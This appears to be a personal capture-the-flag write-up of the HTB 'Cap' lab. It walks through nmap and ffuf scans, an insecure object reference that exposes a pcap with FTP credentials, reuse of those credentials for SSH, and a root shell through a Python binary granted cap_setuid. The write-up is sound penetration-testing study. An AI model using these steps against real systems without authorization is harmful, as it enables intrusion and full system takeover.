# WRITE UP CAP - HTB MACHINE
## MY MAIN IDEA AND WALKTHROUGH:
1. First of all, we need to connect with the VPN from HTB, using the command: ```sudo openvpn <FILE_NAME>.ovpn```
2. OK! now check the HTB website and get the target IP and we are ready to startttt: 
   ![alt text](images/image.png)
3. My first idea is doing some basic scans with this IP address. I always start this step with `Nmap`:
 ```bash
nmap -sV --open <IP_ADDRESS>                      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-06 04:38 +07
Nmap scan report for <IP_ADDRESS>
Host is up (0.20s latency).                              
Not shown: 795 closed tcp ports (conn-refused), 202 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION 
21/tcp open  ftp     vsftpd 3.0.3                        
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
                                                         
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.46 seconds
```
I used the `-sV` flag to scan the version of services are running and `--open` flag to show the open ports only. In the first scan, I did not use `-p-` flag to scan ALL the ports because it takes many time and my computer resources to scan, so in my opinion, if the first time scan returns nothing helpful I will use this flag. (Note: Another useful flag is `-sC`, which runs default `Nmap` scripts against the discovered ports).

4. The `nmap` scan result show us that port 21 (ftp) and 22 (ssh) are opening so I tried to login to ftp and ssh using anonymous acount (maybe the services do not ask password when user login with anonymous account) but it was not succesful.
5. As we can see from the `nmap` scan result, the target IP address has port 80 (http) open. So, my next step is checking the website of this target IP address. 
![alt text](images/image-1.png)
6. Another way to approach is trying to fuzzing web. `ffuf` is my favourite tool for web fuzzing/ enumeration. First, I ran the most basic scan in `ffuf` to find hidden url, directories:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u http:/
/<IP_ADDRESS>/FUZZ -ic                                                                                           
                                                                                                                  
        /'___\  /'___\           /'___\                                                                           
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                           
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://<IP_ADDRESS>/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
 :: Follow redirects : false 
 :: Calibration      : false 
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 19386, Words: 8716, Lines: 389, Duration: 205ms]
data                    [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 208ms]
ip                      [Status: 200, Size: 17453, Words: 7275, Lines: 355, Duration: 221ms]
netstat                 [Status: 200, Size: 32633, Words: 15747, Lines: 488, Duration: 259ms]
capture                 [Status: 302, Size: 220, Words: 21, Lines: 4, Duration: 5362ms]
                        [Status: 200, Size: 19386, Words: 8716, Lines: 389, Duration: 205ms]
:: Progress: [87651/87651] :: Job [1/1] :: 169 req/sec :: Duration: [0:08:32] :: Errors: 0 ::
```
OK! after the scanning process, we have something to discover: `data`, `ip` and `netstat`. But after checking the website, I could not find anything useful.

7. My next step is checking more carefully the website and after a while, I see something interesting:
![alt text](images/image-4.png)
   - In the tab Security Snapshot, the website allowed us to download a `.pcap` file. I noticed that the `url` changed when I revisted this tab. The first time the `url` tail was `/data/1` and the second time it changed to `/data/2` and so on...
   - One more detail that I notice that is when accessing the website, I did not have to login and the session was already logged in as Nathan. So, what if we set the `url` tail to `/data/0` ? Maybe we will have the `.pcap` file that show us the conversation between `Nathan` and server.
     ![alt text](images/image-5.png)
   We did it !! The next step is download `.pcap` file and examine it using `whireshark`.

8. Examine `.pcap` file using `Wireshark`
From the `nmap` scan result above, we know that the `FTP` port is opening. So, at first, I filtered the `pcap` file and tried to know the conversation between `Nathan` and server using `File Transfer Protocol`:
![alt text](images/image-6.png)
We can see clearly the `username: Nathan` and the `password:` so we can try to login to FTP port.
9. Login FTP and gain user key
   
With the password, I succesfully accessed Nathan's account and download `user.txt` file:
```bash
ftp <IP_ADDRESS>
Connected to <IP_ADDRESS>.
220 (vsFTPd 3.0.3)
Name (<IP_ADDRESS>:admin): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||52482|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Jun 07 03:42 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||51525|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |***********************************|    33        0.16 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.03 KiB/s)
ftp> exit
221 Goodbye.
```
Using simple `cat` command we can open the `user.txt` and find the `user key`:
```bash
cat user.txt
<USER_KEY>
```
10. Privilege Escalation & try to gain the root key
   
   - Next step, I tried to login to `ssh` with nathan's account and it was successfull:
   ```bash
   ssh nathan@<IP_ADDRESS>
   nathan@<IP_ADDRESS>'s password: 
   Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
   nathan@cap:~$
   ```
   - I tried to use `sudo -l` to check nathan's account permission but I could not find something: ```Sorry, user nathan may not run sudo on cap.```
   - So, next, I ued ```getcap -r /usr/ 2>/dev/null``` and I found the way to perform Privilege Escalation:
      ```bash
      getcap -r /usr/ 2>/dev/null
      /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
      /usr/bin/ping = cap_net_raw+ep
      /usr/bin/traceroute6.iputils = cap_net_raw+ep
      /usr/bin/mtr-packet = cap_net_raw+ep
      /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
      ```
      Explaination: 
      - `getcap` is the basic tool to scan and check file capabilities. Using `getcap` we can find what we can do with specific files.
      - The `getcap` `-r` flag allowed us to scan in `recursion` mode so we can scan widely.
      - `2>/dev/null` helps eliminate "Permission denied" error messages when scanning files you don't have permission to access.
      After the scanning process, I noticed the line: `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`. This line means in the file `/usr/bin/python3.8` user nathan can change user id (`cap_setuid`). We could perform Privilege Escalation in this way because we could change user_id to `0` which is the root's user_id
   - By using the command ```/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'``` I could set user_id to `0` and call a new shell with root privilege:
      ```bash
      nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
      root@cap:~# whoami
      root
      ```
   - Hurray! We operated Privilege Escalation succesfully. Now we can gain the root key
   ```bash
   root@cap:/home# cd /root
   root@cap:/root# ls
   root.txt  snap
   root@cap:/root# cat root.txt
   <ROOT_KEY>
   ```
## THING I LEARNT AFTER THIS LAB:
- Do not spent to much time in web enum/fuzzing step
- Try to examine the website, url carefully
- Trust the process
